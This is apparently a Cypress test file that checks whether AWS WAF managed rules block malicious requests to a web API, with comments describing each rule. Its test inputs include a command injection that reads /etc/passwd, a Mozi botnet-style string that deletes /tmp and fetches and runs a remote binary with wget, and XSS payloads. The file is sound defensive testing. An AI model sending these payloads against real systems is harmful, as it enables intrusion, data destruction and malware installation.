before(() => {
  cy.visit('');
});

describe('Test WAF behavior', () => {
  // There are WAF rules we don't want turned on

  // NoUserAgent_HEADER 	Blocks requests with no HTTP User-Agent header.

  // UserAgent_BadBots_HEADER 	Inspects for the presence of common User-Agent header values
  // indicating the request to be a bad bot. Example patterns include nessus, and nmap.
  it('Try a header that SHOULD be blocked by UserAgent_BadBots_HEADER', () => {
    const baseUrl = '/organizations';
    cy.request(baseUrl, { headers: { name: 'User-Agent', value: 'Mozilla/5.0 zgrab/0.x' } }).then((resp) => {
      expect(resp.status).to.eq(403);
    });
  });
  // SizeRestrictions_QUERYSTRING 	Verifies that the URI query string length is within the standard boundary for applications.

  //   SizeRestrictions_Cookie_HEADER 	Verifies that the cookie header length is within the bounds common for many applications.

  //   SizeRestrictions_BODY 	Verifies that the request body size is within the bounds common for many applications.

  //   SizeRestrictions_URIPATH 	Verifies that the URI path length is within specification.

  //   EC2MetaDataSSRF_BODY 	Inspects for attempts to exfiltrate Amazon EC2 metadata from the request body.

  //   EC2MetaDataSSRF_COOKIE 	Inspects for attempts to exfiltrate Amazon EC2 metadata from the request cookie.

  //   EC2MetaDataSSRF_URIPATH 	Inspects for attempts to exfiltrate Amazon EC2 metadata from the request URI path.
  it('Try a URL that SHOULD be blocked if EC2MetaDataSSRF_URIPATH were turned on', () => {
    const uglyUrl = '/PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING';
    cy.request(uglyUrl).then((resp) => {
      expect(resp.status).to.eq(403);
    });
  });
  //   EC2MetaDataSSRF_QUERYARGUMENTS 	Inspects for attempts to exfiltrate Amazon EC2 metadata from the request query arguments.

  //   GenericLFI_QUERYARGUMENTS 	Inspects for the presence of Local File Inclusion (LFI) exploits in the query arguments.
  //   Examples include path traversal attempts using techniques like ../../.

  //   GenericLFI_URIPATH 	Inspects for the presence of Local File Inclusion (LFI) exploits in the URI path.
  //   Examples include path traversal attempts using techniques like ../../.
  it('Try a URL that will break if GenericLFI_URIPATH were turned on', () => {
    const uglyUrl =
      '/api/api/ga4gh/v2/tools/%23workflow%2Fgithub.com%2FNCI-GDC%2Fgdc-dnaseq-cwl%2FGDC_DNASeq/versions/master/CWL/descriptor/..%2F..%2Ftools%2Fbam_readgroup_to_json.cwl';
    cy.request(uglyUrl).its('body').should('have.property', 'content');
  });
  //   GenericLFI_BODY 	Inspects for the presence of Local File Inclusion (LFI) exploits in the request body.
  //   Examples include path traversal attempts using techniques like ../../.

  // RestrictedExtensions_URIPATH 	Inspects requests whose URI path includes system file extensions that the
  // clients shouldn't read or run. Example patterns include extensions like .log and .ini.
  it('Try a URL that would break if RestrictedExtensions_URIPATH were turned on', () => {
    const longUrl =
      '/api/ga4gh/trs/v2/tools/%23workflow%2Fgithub.com%2Fnf-core%2Fhlatyping/versions/1.1.2/plain-NFL/descriptor//nextflow.config';
    cy.request(longUrl).its('body').should('include', 'nfcore/hlatyping:1.1.2');
  });
  // RestrictedExtensions_QUERYARGUMENTS 	Inspects requests whose query arguments are system file extensions
  // that the clients shouldn't read or run. Example patterns include extensions like .log and .ini.
  it('Try arguments that SHOULD be blocked if RestrictedExtensions_QUERYARGUMENTS were turned on', () => {
    const uglyUrl = '/gitlab/build_now%3Csvg/onload=alert(1337)%3E';
    cy.request(uglyUrl, {
      qs: {
        next_file:
          'netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',
      },
    }).then((resp) => {
      expect(resp.status).to.eq(403);
    });
  });
  // GenericRFI_QUERYARGUMENTS 	Inspects the values of all query parameters and blocks requests attempting to
  // exploit RFI (Remote File Inclusion) in web applications. Examples include patterns like ://.

  //   GenericRFI_BODY 	Inspects the values of the request body and blocks requests attempting to exploit RFI
  //   (Remote File Inclusion) in web applications. Examples include patterns like ://.

  //   GenericRFI_URIPATH 	Inspects the values of the URI path and blocks requests attempting to exploit RFI
  //   (Remote File Inclusion) in web applications. Examples include patterns like ://.

  //   CrossSiteScripting_COOKIE 	Inspects the value of cookie headers and blocks common cross-site scripting
  //   (XSS) patterns using the built-in XSS detection rule in AWS WAF. Example patterns
  //   include scripts like <script>alert("hello")</script>.

  // CrossSiteScripting_QUERYARGUMENTS 	Inspects the value of query arguments and blocks common cross-site
  // scripting (XSS) patterns using the built-in XSS detection rule in AWS WAF. Example patterns include
  // scripts like <script>alert("hello")</script>.
  it('Try a query arguments that SHOULD be blocked if CrossSiteScripting_QUERYARGUMENTS were turned on', () => {
    const uglyUrl = '/api/static/swagger-ui/index.html';
    cy.request(uglyUrl, { qs: { url: '%22%3Cscript%3E{{{alert(%27hi%27)}}}%22' } }).then((resp) => {
      expect(resp.status).to.eq(403);
    });
  });
  // CrossSiteScripting_BODY 	Inspects the value of the request body and blocks common cross-site scripting
  // (XSS) patterns using the built-in XSS detection rule in AWS WAF. Example patterns include scripts like <script>alert("hello")</script>.

  // CrossSiteScripting_URIPATH 	Inspects the value of the URI path and blocks common cross-site scripting
  // (XSS) patterns using the built-in XSS detection rule in AWS WAF. Example patterns include scripts like <script>alert("hello")</script>.
  it('Try a URI that SHOULD be blocked if CrossSiteScripting_URIPATH were turned on', () => {
    const uglyUrl = '/gitlab/build_now%3Csvg/onload=alert(1337)%3E';
    cy.request(uglyUrl).then((resp) => {
      expect(resp.status).to.eq(403);
    });
  });
});
